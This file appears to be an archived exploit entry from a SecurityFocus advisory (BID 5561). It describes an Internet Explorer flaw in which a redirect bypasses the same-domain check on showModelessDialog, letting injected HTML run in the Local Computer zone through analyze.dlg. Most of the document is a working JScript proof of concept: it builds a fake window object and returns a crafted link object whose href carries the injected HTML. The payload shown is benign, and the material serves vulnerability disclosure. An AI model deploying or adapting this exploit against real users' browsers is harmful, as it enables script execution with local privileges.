@@ -1,0 +1,50 @@
+source: http://www.securityfocus.com/bid/5561/info
+
+Microsoft Internet Explorer includes support for dialog windows through script calls to the two functions showModalDialog and showModelessDialog. These functions accept a URL location for the dialog content, and an option argument parameter to allow data to be passed to the dialog from the calling page.
+
+A check is done to ensure that data is only passed to dialogs located in the same domain as the calling page. This prevents a malicious party from injecting content into arbitrary dialogs. However, if the URL provided as the dialog source redirects to a second location, only the first is subject to this security check.
+
+Exploitation may allow malicious content to be inserted into sensitive dialogs. Execution of arbitrary script within the Local Computer Zone has been demonstrated.
+
+This variant is related to the injection of malicious content into the analyze.dlg dialogue included in shdoclc.dll. This issue was originally included in BID 4527, however a new entry has been allocated to cover the patch released in Microsoft advisory MS02-047. 
+
+<script language="jscript">
+// HTML to be injected (will run in the "My Computer" zone)
+var sHTML="<b>We're in!</b>";
+
+// Object to return from tags("link"), must be a function because they use
+// objects(i) instead of objects[i], VB style collection access.
+function oExploit(iSec) {
+    return {
+        // Satisfy line 201
+        rel:"stylesheet",
+
+        // Satisfy line 204
+        readyState:"exploit",
+
+        // Exploit line 205
+        href:sHTML
+    };
+}
+
+// A length property so it will enter the loop
+oExploit.length=1;
+
+// A fake window object, so no errors will be raised during the process,
+// the custom "tags" method will return an empty array for any element
+// other than our target (<link>), in which case it will return the oExploit
+// object above.
+var oSecurity={
+    document:{
+        all:{
+            tags:function (sTag) {
+                return sTag=="link" ? oExploit : [];
+            }
+        }
+    }
+}
+
+// Run exploit, getFile.asp redirects to res://shdoclc.dll/analyze.dlg
+// and oSecurity (fake window) is sent as the dialog argument.
+showModelessDialog("getFile.asp",oSecurity);
+</script>
